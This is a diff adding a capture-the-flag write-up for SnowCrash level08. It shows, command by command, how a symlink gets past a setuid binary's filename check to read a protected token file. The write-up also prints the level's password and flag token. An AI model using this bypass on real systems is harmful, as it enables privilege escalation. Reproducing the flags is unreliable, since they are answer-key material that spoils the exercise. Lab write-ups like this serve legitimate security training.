@@ -1,0 +1,57 @@
+#We see a file level08 that belong to level08 and flag08
+#the file token belongs only to flag08
+
+level08@SnowCrash:~$ ./level08 
+./level08 [file to read]
+level08@SnowCrash:~$ ll
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
+d--x--x--x  1 root    users    340 Aug 30  2015 ../
+-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
+-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
+-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
+-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
+-rw-------  1 flag08  flag08    26 Mar  5  2016 token
+level08@SnowCrash:~$ ./level08 sdsd
+level08: Unable to open sdsd: No such file or directory
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+level08@SnowCrash:~$ cat token
+cat: token: Permission denied
+
+#We create files that we own
+level08@SnowCrash:~$ echo "abcdef" > /tmp/token
+level08@SnowCrash:~$ echo "abcdef" > /tmp/boby
+
+#We notice that if the file is called token we cannot access it, else it echoes the content:
+level08@SnowCrash:~$ ./level08 /tmp/token
+You may not access '/tmp/token'
+level08@SnowCrash:~$ vim /tmp/boby
+level08@SnowCrash:~$ ./level08 /tmp/boby
+abcdef
+
+
+#We do a symlink to the file token to have a different name
+level08@SnowCrash:~$ ln -s $PWD/token /tmp/bob
+level08@SnowCrash:~$ ./level08 /tmp/bob
+level08@SnowCrash:~$ stat /tmp/bob
+  File: `/tmp/bob' -> `/home/user/level08/token'
+  Size: 24              Blocks: 0          IO Block: 4096   symbolic link
+Device: 13h/19d Inode: 15599       Links: 1
+Access: (0777/lrwxrwxrwx)  Uid: ( 2008/ level08)   Gid: ( 2008/ level08)
+Access: 2024-01-29 16:04:16.412339598 +0100
+Modify: 2024-01-29 16:04:06.208446611 +0100
+Change: 2024-01-29 16:04:06.208446611 +0100
+ Birth: -
+
+#Get the password
+level08@SnowCrash:~$ ./level08 /tmp/bob
+quif5eloekouj29ke0vouxean
+
+level08@SnowCrash:~$ su flag08
+Password: 
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+
